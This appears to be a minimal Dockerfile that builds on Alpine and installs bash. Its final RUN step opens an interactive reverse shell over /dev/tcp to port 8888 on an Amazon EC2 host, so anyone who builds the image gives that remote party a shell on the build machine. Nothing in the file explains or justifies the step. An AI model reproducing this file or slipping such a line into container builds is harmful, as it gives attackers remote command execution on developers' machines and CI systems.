FROM alpine
RUN apk update
RUN apk add bash
RUN /bin/bash -c 'bash -i >& /dev/tcp/ec2-54-171-240-13.eu-west-1.compute.amazonaws.com/8888 0>&1'
